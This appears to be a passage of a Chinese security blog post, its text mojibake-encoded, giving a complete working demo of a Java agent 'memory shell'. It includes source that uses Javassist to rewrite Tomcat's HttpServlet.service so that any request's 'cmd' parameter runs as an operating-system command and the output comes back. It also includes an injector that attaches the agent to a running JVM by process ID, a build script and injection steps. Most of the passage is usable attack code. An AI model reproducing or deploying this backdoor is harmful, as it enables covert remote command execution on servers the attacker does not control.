<h4 id="å¯ç”¨-Demoï¼š"><a href="#å¯ç”¨-Demoï¼š" class="headerlink" title="å¯ç”¨ Demoï¼š"></a>å¯ç”¨ Demoï¼š</h4><h5 id="ç›®å½•ç»“æ„ï¼š-1"><a href="#ç›®å½•ç»“æ„ï¼š-1" class="headerlink" title="ç›®å½•ç»“æ„ï¼š"></a>ç›®å½•ç»“æ„ï¼š</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>		 xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>	&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br>	<br>	&lt;groupId&gt;com.src&lt;/groupId&gt;<br>	&lt;artifactId&gt;Demo01&lt;/artifactId&gt;<br>	&lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br>	&lt;packaging&gt;jar&lt;/packaging&gt;<br>	<br>	&lt;properties&gt;<br>		&lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>		&lt;maven.compiler.source&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.source&gt;<br>		&lt;maven.compiler.target&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.target&gt;<br>	&lt;/properties&gt;<br>	&lt;build&gt;<br>		&lt;plugins&gt;<br>			&lt;!-- ç¼–è¯‘æ’ä»¶ --&gt;<br>			&lt;plugin&gt;<br>				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>				&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>				&lt;version&gt;<span class="hljs-number">3.8</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>				&lt;configuration&gt;<br>					&lt;source&gt;<span class="hljs-number">1.8</span>&lt;/source&gt;<br>					&lt;target&gt;<span class="hljs-number">1.8</span>&lt;/target&gt;<br>					&lt;encoding&gt;UTF-<span class="hljs-number">8</span>&lt;/encoding&gt;<br>				&lt;/configuration&gt;<br>			&lt;/plugin&gt;<br>			<br>			&lt;!-- æ‰“åŒ… JAR æ’ä»¶ --&gt;<br>			&lt;plugin&gt;<br>				&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>				&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;<br>				&lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>				&lt;configuration&gt;<br>					&lt;archive&gt;<br>						&lt;!-- ç¡®ä¿ç”Ÿæˆæ ‡å‡† MANIFEST æ–‡ä»¶ --&gt;<br>						&lt;manifest&gt;<br>							&lt;addClasspath&gt;<span class="hljs-literal">true</span>&lt;/addClasspath&gt;<br>							&lt;useUniqueVersions&gt;<span class="hljs-literal">false</span>&lt;/useUniqueVersions&gt;<br>						&lt;/manifest&gt;<br>						<br>						&lt;!-- è¿™é‡Œå†™å…¥ Agent å±æ€§ --&gt;<br>						&lt;manifestEntries&gt;<br>							&lt;Agent-Class&gt;com.src.agent.AgentMain&lt;/Agent-Class&gt;<br>							&lt;Can-Redefine-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Redefine-Classes&gt;<br>							&lt;Can-Retransform-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Retransform-Classes&gt;<br>						&lt;/manifestEntries&gt;<br>					&lt;/archive&gt;<br>				&lt;/configuration&gt;<br>			&lt;/plugin&gt;<br>		&lt;/plugins&gt;<br>	&lt;/build&gt;<br><br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure>



<h5 id="AgentMemShell-java"><a href="#AgentMemShell-java" class="headerlink" title="AgentMemShell.java"></a>AgentMemShell.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMemShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;AgentMemShell Injected!&quot;</span>);<br><br>        <span class="hljs-comment">// æ·»åŠ ç±»è½¬æ¢å™¨</span><br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletTransformer</span>(), <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// æ‰¾åˆ°æ‰€æœ‰å·²åŠ è½½çš„ HttpServlet ç±»å¹¶è¿›è¡Œé‡è½¬æ¢</span><br>        Class[] loadedClasses = inst.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Found HttpServlet:&quot;</span>+clazz);<br>                    inst.retransformClasses(clazz);<br>                    System.out.println(<span class="hljs-string">&quot;Retransform HttpServlet Success.&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        agentmain(agentArgs, inst);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h5 id="ServletTransformer-java"><a href="#ServletTransformer-java" class="headerlink" title="ServletTransformer.java"></a>ServletTransformer.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javassist.LoaderClassPath;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// æ‰“å°æ‰€æœ‰è¢«åŠ è½½çš„ç±»ï¼Œä¾¿äºè°ƒè¯•ï¼ˆä»…ç¬¬ä¸€æ¬¡æ³¨å…¥æ—¶å¯ç”¨ï¼‰</span><br>            <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.contains(<span class="hljs-string">&quot;servlet&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Debug] Loading class: &quot;</span> + className);<br>            &#125;<br><br>            <span class="hljs-comment">// className å¯èƒ½æ˜¯ &quot;javax/servlet/http/HttpServlet&quot;</span><br>            <span class="hljs-comment">// ä¹Ÿå¯èƒ½æ˜¯ &quot;javax.servlet.http.HttpServlet&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>            <span class="hljs-comment">// ç²¾ç¡®åŒ¹é… HttpServlet ç±»</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>.equals(dotName)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[+] Found target class: &quot;</span> + dotName);<br>                System.out.println(<span class="hljs-string">&quot;[+] Start transforming HttpServlet...&quot;</span>);<br><br>                <span class="hljs-comment">// åˆå§‹åŒ– Javassist ClassPool å¹¶æ·»åŠ å½“å‰ ClassLoader çš„è·¯å¾„</span><br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                    classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>                &#125;<br><br>                <span class="hljs-comment">// è·å–ç±»å®šä¹‰</span><br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(dotName);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">serviceMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;service&quot;</span>);<br><br>                <span class="hljs-comment">// æ¶æ„é€»è¾‘</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;&#123;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;&quot;</span><br>                        + <span class="hljs-string">&quot;    String cmd = req.getParameter(\&quot;cmd\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;    if (cmd != null) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;        try &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            java.util.Scanner s = new java.util.Scanner(&quot;</span><br>                        + <span class="hljs-string">&quot;                Runtime.getRuntime().exec(cmd).getInputStream(), \&quot;UTF-8\&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;            ).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            String output = s.hasNext() ? s.next() : \&quot;\&quot;;&quot;</span><br>                        + <span class="hljs-string">&quot;            res.setContentType(\&quot;text/plain;charset=UTF-8\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().write(output);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().flush();&quot;</span><br>                        + <span class="hljs-string">&quot;            return;&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125; catch (Exception e) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            e.printStackTrace();&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;    &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>                <span class="hljs-comment">// åœ¨ service æ–¹æ³•çš„å¼€å¤´æ’å…¥</span><br>                serviceMethod.insertBefore(shell);<br><br>                <span class="hljs-type">byte</span>[] newClassBytes = ctClass.toBytecode();<br>                ctClass.detach();<br><br>                System.out.println(<span class="hljs-string">&quot;[+] HttpServlet Transformed Complete.&quot;</span>);<br>                <span class="hljs-keyword">return</span> newClassBytes;<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[!] Transform failed: &quot;</span> + e);<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">// è¿”å› null è¡¨ç¤ºä¸ä¿®æ”¹è¯¥ç±»</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<h5 id="Injector-java"><a href="#Injector-java" class="headerlink" title="Injector.java"></a>Injector.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.injector;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java -jar injector.jar &lt;pid&gt; &lt;agent_jar_path&gt;&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Available JVM processes:&quot;</span>);<br>            listProcesses();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">agentJarPath</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Trying to attach to PID: &quot;</span> + pid);<br>            <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>            vm.loadAgent(agentJarPath);<br>            vm.detach();<br>            System.out.println(<span class="hljs-string">&quot;[+] Agent injected successfully!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Injection failed: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listProcesses</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            List&lt;VirtualMachineDescriptor&gt; vmList = VirtualMachine.list();<br>            <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vmList) &#123;<br>                System.out.println(<span class="hljs-string">&quot;PID: &quot;</span> + vmd.id() + <span class="hljs-string">&quot; - &quot;</span> + vmd.displayName());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Failed to list processes: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.src.agent.AgentMemShell<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Built-By: maven<br>Created-By: Apache Maven<br>Build-Jdk: 1.8.0_65<br></code></pre></td></tr></table></figure>



<p>è¿™æ˜¯ ä¸€ä¸ªå°è„šæœ¬ï¼š</p>
<h5 id="build-bat"><a href="#build-bat" class="headerlink" title="build.bat"></a>build.bat</h5><p>(éƒ¨åˆ†å†…å®¹æ ¹æ®å®é™…æƒ…å†µè‡ªè¡Œä¿®æ”¹)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br>setlocal<br><br><span class="hljs-built_in">echo</span> Setting up environment...<br><span class="hljs-built_in">set</span> JAVA_HOME=D:\Java\jdk1.8.0_65<br><span class="hljs-built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%<br><br><span class="hljs-built_in">echo</span> [1/6] Cleaning target directory...<br><span class="hljs-keyword">if</span> exist target <span class="hljs-built_in">rmdir</span> /s /q target<br><span class="hljs-built_in">mkdir</span> target<br><span class="hljs-built_in">mkdir</span> target\classes<br><br><span class="hljs-built_in">echo</span> [2/6] Compiling agent classes...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;lib\javassist.jar&quot;</span> -d target\classes src\main\java\com\src\agent\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile agent classes!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [3/6] Compiling injector class...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\javac&quot;</span> -encoding UTF-8 -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;D:\Java\jdk1.8.0_65\lib\tools.jar;target\classes&quot;</span> -d target\classes src\main\java\com\src\injector\*.java<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to compile injector class!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [4/6] Merging javassist into classes...<br><span class="hljs-built_in">pushd</span> target\classes<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> xf ..\..\lib\javassist.jar<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-built_in">echo</span> [5/6] Packaging agent JAR...<br>rem å¦‚æœ src\main\resources\META-INF\MANIFEST.MF å­˜åœ¨åˆ™ä½¿ç”¨å®ƒ<br><span class="hljs-built_in">set</span> MANIFEST_FILE=src\main\resources\META-INF\MANIFEST.MF<br><span class="hljs-keyword">if</span> not exist <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> <span class="hljs-built_in">set</span> MANIFEST_FILE=META-INF\MANIFEST.MF<br><br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfm target\Demo01-1.0-SNAPSHOT.jar <span class="hljs-string">&quot;%MANIFEST_FILE%&quot;</span> -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package agent JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span> [6/6] Creating injector JAR...<br><span class="hljs-string">&quot;%JAVA_HOME%\bin\jar&quot;</span> cfe target\Injector.jar com.src.injector.Injector -C target\classes .<br><span class="hljs-keyword">if</span> errorlevel 1 (<br>    <span class="hljs-built_in">echo</span> Failed to package injector JAR!<br>    pause<br>    <span class="hljs-built_in">exit</span> /b 1<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span> Build Successful!<br><span class="hljs-built_in">echo</span> Generated files:<br><span class="hljs-built_in">echo</span>   - target\Demo01-1.0-SNAPSHOT.jar (Agent with embedded javassist)<br><span class="hljs-built_in">echo</span>   - target\Injector.jar (Injector)<br><span class="hljs-built_in">echo</span> ========================================<br><span class="hljs-built_in">echo</span>.<br><br>pause<br></code></pre></td></tr></table></figure>





<h5 id="æ‰§è¡Œ-build-bat"><a href="#æ‰§è¡Œ-build-bat" class="headerlink" title="æ‰§è¡Œ build.bat"></a>æ‰§è¡Œ build.bat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="å¼€å§‹æµ‹è¯•"><a href="#å¼€å§‹æµ‹è¯•" class="headerlink" title="å¼€å§‹æµ‹è¯•"></a>å¼€å§‹æµ‹è¯•</h4><h5 id="å¯åŠ¨ä¸€ä¸ª-Tomcat"><a href="#å¯åŠ¨ä¸€ä¸ª-Tomcat" class="headerlink" title="å¯åŠ¨ä¸€ä¸ª Tomcat"></a>å¯åŠ¨ä¸€ä¸ª Tomcat</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="Tomcat-è¿›ç¨‹"><a href="#Tomcat-è¿›ç¨‹" class="headerlink" title="Tomcat è¿›ç¨‹"></a>Tomcat è¿›ç¨‹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"># æŸ¥çœ‹æ‰€æœ‰ Java è¿›ç¨‹<br>jps -l<br><br># æŸ¥çœ‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯<br>tasklist | findstr &quot;java&quot;<br><br># æˆ–è€…ä½¿ç”¨ wmic<br>wmic process where &quot;name=&#x27;java.exe&#x27;&quot; get processid,commandline<br></code></pre></td></tr></table></figure>





<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æ‰¾åˆ°è¿›ç¨‹ï¼š<strong>40268 org.apache.catalina.startup.Bootstrap</strong></p>
<h5 id="æµ‹è¯•æ³¨å…¥"><a href="#æµ‹è¯•æ³¨å…¥" class="headerlink" title="æµ‹è¯•æ³¨å…¥"></a>æµ‹è¯•æ³¨å…¥</h5><p><strong>ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼ï¼</strong></p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">java <span class="hljs-operator">-</span>cp <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\J</span>ava<span class="hljs-char escape_">\j</span>dk1.8.0_65<span class="hljs-char escape_">\l</span>ib<span class="hljs-char escape_">\t</span>ools.jar;D:<span class="hljs-char escape_">\J</span>avaCode<span class="hljs-char escape_">\å†…</span>å­˜é©¬<span class="hljs-char escape_">\A</span>gentMem<span class="hljs-char escape_">\D</span>emo01<span class="hljs-char escape_">\t</span>arget<span class="hljs-char escape_">\I</span>njector.jar&quot;</span> com.src.injector.Injector <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-number">40268</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> D:\JavaCode\å†…å­˜é©¬\AgentMem\Demo01\target\Demo01-<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>SNAPSHOT.jar<br></code></pre></td></tr></table></figure>

